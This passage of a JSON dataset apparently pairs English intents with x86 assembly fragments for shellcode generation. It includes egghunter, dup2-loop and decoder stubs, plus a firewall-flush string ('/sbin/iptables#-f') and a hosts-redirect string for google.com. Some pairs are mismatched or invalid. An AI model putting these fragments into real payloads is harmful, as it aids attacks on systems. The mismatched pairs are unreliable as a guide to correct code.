      "done",
      "label"
    ],
    "snippet_tokens": [
      "done",
      ":"
    ]
  },
  {
    "intent": "declare the download label",
    "rewritten_intent": "declare the download label",
    "snippet": "download:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "download",
      "label"
    ],
    "snippet_tokens": [
      "download",
      ":"
    ]
  },
  {
    "intent": "define download function",
    "rewritten_intent": "define download function",
    "snippet": "download:",
    "slot_map": {
      "download": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the dup2 label",
    "rewritten_intent": "declare the dup2 label",
    "snippet": "dup2:",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define dup2 function",
    "rewritten_intent": "define dup2 function",
    "snippet": "dup2:",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "delcare the dup2loop label",
    "rewritten_intent": "delcare the dup2loop label",
    "snippet": "dup2loop:",
    "slot_map": {
      "delcare": "var0",
      "dup2loop": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "var1",
      ":"
    ]
  },
  {
    "intent": "declare the duploop label",
    "rewritten_intent": "declare the duploop label",
    "snippet": "duploop:",
    "slot_map": {
      "duploop": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define duploop function",
    "rewritten_intent": "define duploop function",
    "snippet": "duploop:",
    "slot_map": {
      "duploop": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define egg equal to 'egg '",
    "rewritten_intent": "define egg equal to 'egg '",
    "snippet": "egg equ 'egg '",
    "slot_map": {
      "'egg '": "var0"
    },
    "intent_tokens": [
      "define",
      "egg",
      "equal",
      "var0"
    ],
    "snippet_tokens": [
      "egg",
      "equ",
      "var0"
    ]
  },
  {
    "intent": "define egg1 equal to 'mark'",
    "rewritten_intent": "define egg1 equal to 'mark'",
    "snippet": "egg1 equ 'mark'",
    "slot_map": {
      "'mark'": "var1",
      "egg1": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "var1"
    ]
  },
  {
    "intent": "declare the egghunter label",
    "rewritten_intent": "declare the egghunter label",
    "snippet": "egghunter:",
    "slot_map": {
      "egghunter": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the end label",
    "rewritten_intent": "declare the end label",
    "snippet": "end:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "end",
      "label"
    ],
    "snippet_tokens": [
      "end",
      ":"
    ]
  },
  {
    "intent": "declare the entrypoint label",
    "rewritten_intent": "declare the entrypoint label",
    "snippet": "entrypoint:",
    "slot_map": {
      "entrypoint": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define even_number function",
    "rewritten_intent": "define even_number function",
    "snippet": "even_number:",
    "slot_map": {
      "even_number": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the execfile label",
    "rewritten_intent": "declare the execfile label",
    "snippet": "execfile:",
    "slot_map": {
      "execfile": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define exit_call equal to 1",
    "rewritten_intent": "define exit_call equal to 1",
    "snippet": "exit_call equ 1",
    "slot_map": {
      "exit_call": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "1"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "1"
    ]
  },
  {
    "intent": "declare the exit_on_error label",
    "rewritten_intent": "declare the exit_on_error label",
    "snippet": "exit_on_error:",
    "slot_map": {
      "exit_on_error": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define exit function",
    "rewritten_intent": "define exit function",
    "snippet": "exit:",
    "slot_map": {
      "exit": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the exit label",
    "rewritten_intent": "define the exit label",
    "snippet": "exit:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "exit",
      "label"
    ],
    "snippet_tokens": [
      "exit",
      ":"
    ]
  },
  {
    "intent": "declare the exit label",
    "rewritten_intent": "declare the exit label",
    "snippet": "exit:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "exit",
      "label"
    ],
    "snippet_tokens": [
      "exit",
      ":"
    ]
  },
  {
    "intent": "define F2 and call the function function_2",
    "rewritten_intent": "define F2 and call the function function_2",
    "snippet": "F2: \\n call function_1",
    "slot_map": {
      "F2": "var0",
      "function_2": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "function",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "function_1"
    ]
  },
  {
    "intent": "in the function F2 jump to label L1 if the current byte of the shellcode is greater than 0x2 else add 0x2 to the byte of the shellcode and jump to L2",
    "rewritten_intent": "in the function F2 jump to label L1 if the current byte of the shellcode is greater than 0x2 else add 0x2 to the byte of the shellcode and jump to L2",
    "snippet": "F2: \\n cmp byte [esi], 0x2 \\n jg L1 \\n add byte [esi], 0x2 \\n jmp L2",
    "slot_map": {
      "F2": "var0",
      "L1": "var1",
      "L2": "var6",
      "0x2": "var3"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "jump",
      "label",
      "var1",
      "if",
      "current",
      "byte",
      "shellcode",
      "greater",
      "var3",
      "else",
      "add",
      "var3",
      "byte",
      "shellcode",
      "and",
      "jump",
      "var6"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var3",
      "\\n",
      "jg",
      "var1",
      "\\n",
      "add",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var3",
      "\\n",
      "jmp",
      "var6"
    ]
  },
  {
    "intent": "declare F2 and point to the next byte in esi",
    "rewritten_intent": "declare F2 and point to the next byte in esi",
    "snippet": "F2: \\n inc esi",
    "slot_map": {
      "F2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "declare F2 and point to the next word in esi",
    "rewritten_intent": "declare F2 and point to the next word in esi",
    "snippet": "F2: \\n inc esi \\n inc esi",
    "slot_map": {
      "F2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "point",
      "next",
      "word",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "define F2 function and jump to L3",
    "rewritten_intent": "define F2 function and jump to L3",
    "snippet": "F2: \\n jmp L3",
    "slot_map": {
      "L3": "var1",
      "F2": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "in the function F2 negate bl and move bl to the next byte",
    "rewritten_intent": "in the function F2 negate bl and move bl to the next byte",
    "snippet": "F2: \\n not bl \\n inc bl",
    "slot_map": {
      "F2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "negate",
      "var1",
      "and",
      "move",
      "var1",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "declare F2, negate bl and move bl to the next byte",
    "rewritten_intent": "declare F2, negate bl and move bl to the next byte",
    "snippet": "F2: \\n not bl \\n inc bl",
    "slot_map": {
      "F2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "negate",
      "var1",
      "and",
      "move",
      "var1",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "declare F2, negate bl and point to the next byte in bl",
    "rewritten_intent": "declare F2, negate bl and point to the next byte in bl",
    "snippet": "F2: \\n not bl \\n inc bl",
    "slot_map": {
      "F2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "negate",
      "var1",
      "and",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "in F2 point to the next byte of the eax register and jump to label L2",
    "rewritten_intent": "in F2 point to the next byte of the eax register and jump to label L2",
    "snippet": "F2: inc eax \\n jmp L1",
    "slot_map": {
      "F2": "var0",
      "L2": "var2",
      "eax": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "point",
      "next",
      "byte",
      "var1",
      "register",
      "and",
      "jump",
      "label",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "inc",
      "var1",
      "\\n",
      "jmp",
      "L1"
    ]
  },
  {
    "intent": "define F3 and call the function function_3",
    "rewritten_intent": "define F3 and call the function function_3",
    "snippet": "F3: \\n call function_1",
    "slot_map": {
      "F3": "var0",
      "function_3": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "function",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "function_1"
    ]
  },
  {
    "intent": "in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2",
    "rewritten_intent": "in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2",
    "snippet": "F3: \\n cmp byte [esi], 0x3 \\n je L1 \\n mov byte [esi], 0x3 \\n jmp L2",
    "slot_map": {
      "F3": "var0",
      "L1": "var1",
      "L2": "var7",
      "0x3": "var3",
      "esi": "var6"
    },
    "intent_tokens": [
      "in",
      "routine",
      "var0",
      "jump",
      "label",
      "var1",
      "if",
      "current",
      "byte",
      "shellcode",
      "equal",
      "var3",
      "else",
      "move",
      "var3",
      "byte",
      "var6",
      "and",
      "jump",
      "var7"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "var6",
      "]",
      ",",
      "var3",
      "\\n",
      "je",
      "var1",
      "\\n",
      "mov",
      "byte",
      "[",
      "var6",
      "]",
      ",",
      "var3",
      "\\n",
      "jmp",
      "var7"
    ]
  },
  {
    "intent": "declare F3 function and point to the next byte in edi",
    "rewritten_intent": "declare F3 function and point to the next byte in edi",
    "snippet": "F3: \\n inc edi",
    "slot_map": {
      "F3": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function",
      "and",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "declare F3 function and point to the next word in edi",
    "rewritten_intent": "declare F3 function and point to the next word in edi",
    "snippet": "F3: \\n inc edi \\n edi",
    "slot_map": {
      "F3": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function",
      "and",
      "point",
      "next",
      "word",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1",
      "\\n",
      "var1"
    ]
  },
  {
    "intent": "define F3 and jump to L5",
    "rewritten_intent": "define F3 and jump to L5",
    "snippet": "F3: \\n jmp L5",
    "slot_map": {
      "F3": "var0",
      "L5": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "in the function F3 negate al and move al to the next byte",
    "rewritten_intent": "in the function F3 negate al and move al to the next byte",
    "snippet": "F3: \\n not al \\n inc al",
    "slot_map": {
      "F3": "var0"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "negate",
      "al",
      "and",
      "move",
      "al",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "al",
      "\\n",
      "inc",
      "al"
    ]
  },
  {
    "intent": "define the function F3, negate al and move al to the next byte",
    "rewritten_intent": "define the function F3, negate al and move al to the next byte",
    "snippet": "F3: \\n not al \\n inc al",
    "slot_map": {
      "F3": "var0"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "negate",
      "al",
      "and",
      "move",
      "al",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "al",
      "\\n",
      "inc",
      "al"
    ]
  },
  {
    "intent": "define the function F3, negate al and point to the next byte in al",
    "rewritten_intent": "define the function F3, negate al and point to the next byte in al",
    "snippet": "F3: \\n not al \\n inc al",
    "slot_map": {
      "F3": "var0"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "negate",
      "al",
      "and",
      "point",
      "next",
      "byte",
      "al"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "al",
      "\\n",
      "inc",
      "al"
    ]
  },
  {
    "intent": "define the function F3, move to the next byte of ebx and jump short to L2",
    "rewritten_intent": "define the function F3, move to the next byte of ebx and jump short to L2",
    "snippet": "F3: inc ebx \\n jmp short L2",
    "slot_map": {
      "F3": "var0",
      "L2": "var2",
      "ebx": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "move",
      "next",
      "byte",
      "var1",
      "and",
      "jump",
      "short",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "inc",
      "var1",
      "\\n",
      "jmp",
      "short",
      "var2"
    ]
  },
  {
    "intent": "define F4 and call the function function_4",
    "rewritten_intent": "define F4 and call the function function_4",
    "snippet": "F4: \\n call function_1",
    "slot_map": {
      "F4": "var0",
      "function_4": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "function",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "function_1"
    ]
  },
  {
    "intent": "in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2",
    "rewritten_intent": "in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2",
    "snippet": "F4: \\n cmp byte [esi], 0x1 \\n jl L1 \\n sub byte [esi], 0x1 \\n jmp L2",
    "slot_map": {
      "F4": "var0",
      "L1": "var1",
      "L2": "var8",
      "0x1": "var5",
      "esi": "var3"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "jump",
      "label",
      "var1",
      "if",
      "byte",
      "specified",
      "address",
      "var3",
      "lower",
      "var5",
      "else",
      "subtract",
      "var5",
      "byte",
      "address",
      "var3",
      "and",
      "jump",
      "var8"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "jl",
      "var1",
      "\\n",
      "sub",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "jmp",
      "var8"
    ]
  },
  {
    "intent": "declare F4 and jump short to F5",
    "rewritten_intent": "declare F4 and jump short to F5",
    "snippet": "F4: \\n jmp short L5",
    "slot_map": {
      "F4": "var0",
      "F5": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "L5"
    ]
  },
  {
    "intent": "in the function F4 negate dl and point to the next byte in the dl register",
    "rewritten_intent": "in the function F4 negate dl and point to the next byte in the dl register",
    "snippet": "F4: \\n not dl \\n inc dl",
    "slot_map": {
      "F4": "var0"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "negate",
      "dl",
      "and",
      "point",
      "next",
      "byte",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "dl",
      "\\n",
      "inc",
      "dl"
    ]
  },
  {
    "intent": "declare the function F4, negate dl and move dl to the next byte",
    "rewritten_intent": "declare the function F4, negate dl and move dl to the next byte",
    "snippet": "F4: \\n not dl \\n inc dl",
    "slot_map": {
      "F4": "var0"
    },
    "intent_tokens": [
      "declare",
      "function",
      "var0",
      "negate",
      "dl",
      "and",
      "move",
      "dl",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "dl",
      "\\n",
      "inc",
      "dl"
    ]
  },
  {
    "intent": "declare F4, move to the next byte in ecx and jump to L2",
    "rewritten_intent": "declare F4, move to the next byte in ecx and jump to L2",
    "snippet": "F4: inc ecx \\n jmp L2",
    "slot_map": {
      "F4": "var0",
      "L2": "var2",
      "ecx": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "move",
      "next",
      "byte",
      "var1",
      "and",
      "jump",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "inc",
      "var1",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "define F5 and call the function function_5",
    "rewritten_intent": "define F5 and call the function function_5",
    "snippet": "F5: \\n call function_1",
    "slot_map": {
      "F5": "var0",
      "function_5": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "function",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "function_1"
    ]
  },
  {
    "intent": "in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2",
    "rewritten_intent": "in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2",
    "snippet": "F5: \\n cmp byte [esi], 0x2 \\n jg L1 \\n add byte [esi], 0x2 \\n jmp L2",
    "slot_map": {
      "F5": "var0",
      "L1": "var1",
      "L2": "var8",
      "0x2": "var5",
      "esi": "var3"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "jump",
      "label",
      "var1",
      "if",
      "byte",
      "address",
      "var3",
      "greater",
      "var5",
      "else",
      "add",
      "var5",
      "byte",
      "address",
      "var3",
      "and",
      "jump",
      "var8"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "jg",
      "var1",
      "\\n",
      "add",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "jmp",
      "var8"
    ]
  },
  {
    "intent": "declare F5 and jump to L1",
    "rewritten_intent": "declare F5 and jump to L1",
    "snippet": "F5: \\n jmp L1",
    "slot_map": {
      "F5": "var0",
      "L1": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "define the function F5, increment edx and jump short to L3",
    "rewritten_intent": "define the function F5, increment edx and jump short to L3",
    "snippet": "F5: inc edx \\n jmp short L3",
    "slot_map": {
      "F5": "var0",
      "L3": "var2",
      "edx": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "increment",
      "var1",
      "and",
      "jump",
      "short",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "inc",
      "var1",
      "\\n",
      "jmp",
      "short",
      "var2"
    ]
  },
  {
    "intent": "in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2",
    "rewritten_intent": "in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2",
    "snippet": "F6: \\n cmp byte [esi], 0x3 \\n je L1 \\n mov byte [esi], 0x3 \\n jmp L2",
    "slot_map": {
      "F6": "var0",
      "L1": "var1",
      "L2": "var8",
      "0x3": "var5",
      "esi": "var3"
    },
    "intent_tokens": [
      "in",
      "routine",
      "var0",
      "jump",
      "label",
      "var1",
      "if",
      "byte",
      "address",
      "specified",
      "var3",
      "equal",
      "var5",
      "else",
      "move",
      "var5",
      "byte",
      "var3",
      "and",
      "jump",
      "var8"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "je",
      "var1",
      "\\n",
      "mov",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var5",
      "\\n",
      "jmp",
      "var8"
    ]
  },
  {
    "intent": "define file as the byte string '/sbin/iptables#-f'",
    "rewritten_intent": "define file as the byte string '/sbin/iptables#-f'",
    "snippet": "file: db '/sbin/iptables#-f'",
    "slot_map": {
      "'/sbin/iptables#-f'": "var0"
    },
    "intent_tokens": [
      "define",
      "file",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "file",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare the fileaddress label",
    "rewritten_intent": "declare the fileaddress label",
    "snippet": "fileaddress:",
    "slot_map": {
      "fileaddress": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "reserve filecontents variable of 128 bytes",
    "rewritten_intent": "reserve filecontents variable of 128 bytes",
    "snippet": "filecontents: resb 128",
    "slot_map": {
      "filecontents": "var0"
    },
    "intent_tokens": [
      "reserve",
      "var0",
      "variable",
      "128",
      "bytes"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "resb",
      "128"
    ]
  },
  {
    "intent": "create a string filename and initialize to 'readme.txt'",
    "rewritten_intent": "create a string filename and initialize to 'readme.txt'",
    "snippet": "filename: db 'readme.txt', 0h",
    "slot_map": {
      "'readme.txt'": "var0"
    },
    "intent_tokens": [
      "create",
      "string",
      "filename",
      "and",
      "initialize",
      "var0"
    ],
    "snippet_tokens": [
      "filename",
      ":",
      "db",
      "var0",
      ",",
      "0h"
    ]
  },
  {
    "intent": "reserve a variable filename of 255 bytes",
    "rewritten_intent": "reserve a variable filename of 255 bytes",
    "snippet": "filename: resb 255",
    "slot_map": {},
    "intent_tokens": [
      "reserve",
      "variable",
      "filename",
      "255",
      "bytes"
    ],
    "snippet_tokens": [
      "filename",
      ":",
      "resb",
      "255"
    ]
  },
  {
    "intent": "declare the fill label",
    "rewritten_intent": "declare the fill label",
    "snippet": "fill:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "fill",
      "label"
    ],
    "snippet_tokens": [
      "fill",
      ":"
    ]
  },
  {
    "intent": "define fill label",
    "rewritten_intent": "define fill label",
    "snippet": "fill:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "fill",
      "label"
    ],
    "snippet_tokens": [
      "fill",
      ":"
    ]
  },
  {
    "intent": "declare the find_egg label",
    "rewritten_intent": "declare the find_egg label",
    "snippet": "find_egg:",
    "slot_map": {
      "find_egg": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define find_egg function",
    "rewritten_intent": "define find_egg function",
    "snippet": "find_egg:",
    "slot_map": {
      "find_egg": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the format label",
    "rewritten_intent": "declare the format label",
    "snippet": "format:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "format",
      "label"
    ],
    "snippet_tokens": [
      "format",
      ":"
    ]
  },
  {
    "intent": "declare the formatting label",
    "rewritten_intent": "declare the formatting label",
    "snippet": "formatting:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "formatting",
      "label"
    ],
    "snippet_tokens": [
      "formatting",
      ":"
    ]
  },
  {
    "intent": "define function_1 and execute it",
    "rewritten_intent": "define function_1 and execute it",
    "snippet": "function_1: \\n call [esp]",
    "slot_map": {
      "function_1": "var1",
      "define": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "and",
      "execute",
      "it"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "declare function_2 and execute it",
    "rewritten_intent": "declare function_2 and execute it",
    "snippet": "function_2: \\n call [esp]",
    "slot_map": {
      "function_2": "var1",
      "declare": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "and",
      "execute",
      "it"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "declare function_3 and call it",
    "rewritten_intent": "declare function_3 and call it",
    "snippet": "function_3: \\n call [esp]",
    "slot_map": {
      "function_3": "var1",
      "declare": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "and",
      "call",
      "it"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define function_4 and call it",
    "rewritten_intent": "define function_4 and call it",
    "snippet": "function_4: \\n call [esp]",
    "slot_map": {
      "function_4": "var1",
      "define": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "and",
      "call",
      "it"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define function_5 and execute it",
    "rewritten_intent": "define function_5 and execute it",
    "snippet": "function_5: \\n call [esp]",
    "slot_map": {
      "function_5": "var1",
      "define": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "and",
      "execute",
      "it"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define fupdisasm function",
    "rewritten_intent": "define fupdisasm function",
    "snippet": "fupdisasm:",
    "slot_map": {
      "fupdisasm": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define fupdisasm label",
    "rewritten_intent": "define fupdisasm label",
    "snippet": "fupdisasm:",
    "slot_map": {
      "fupdisasm": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare _shell as global label",
    "rewritten_intent": "declare _shell as global label",
    "snippet": "global _shell",
    "slot_map": {
      "_shell": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "global",
      "label"
    ],
    "snippet_tokens": [
      "global",
      "var0"
    ]
  },
  {
    "intent": "declare of the global _start",
    "rewritten_intent": "declare of the global _start",
    "snippet": "global _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "declare",
      "global",
      "var0"
    ],
    "snippet_tokens": [
      "global",
      "var0"
    ]
  },
  {
    "intent": "global _start",
    "rewritten_intent": "global _start",
    "snippet": "global _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "global",
      "var0"
    ],
    "snippet_tokens": [
      "global",
      "var0"
    ]
  },
  {
    "intent": "define the program entry point",
    "rewritten_intent": "define the program entry point",
    "snippet": "global _start",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "program",
      "entry",
      "point"
    ],
    "snippet_tokens": [
      "global",
      "_start"
    ]
  },
  {
    "intent": "declare _start as global label",
    "rewritten_intent": "declare _start as global label",
    "snippet": "global _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "global",
      "label"
    ],
    "snippet_tokens": [
      "global",
      "var0"
    ]
  },
  {
    "intent": "define google as the byte string '127.1.1.1 google.com'",
    "rewritten_intent": "define google as the byte string '127.1.1.1 google.com'",
    "snippet": "google db '127.1.1.1 google.com'",
    "slot_map": {
      "'127.1.1.1 google.com'": "var0"
    },
    "intent_tokens": [
      "define",
      "google",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "google",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string google and initialize it to '127.1.1.1 google.com'",
    "rewritten_intent": "define the byte string google and initialize it to '127.1.1.1 google.com'",
    "snippet": "google: db '127.1.1.1 google.com'",
    "slot_map": {
      "'127.1.1.1 google.com'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "google",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "google",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare the gotocall label",
    "rewritten_intent": "declare the gotocall label",
    "snippet": "gotocall:",
    "slot_map": {
      "gotocall": "var0"
    },
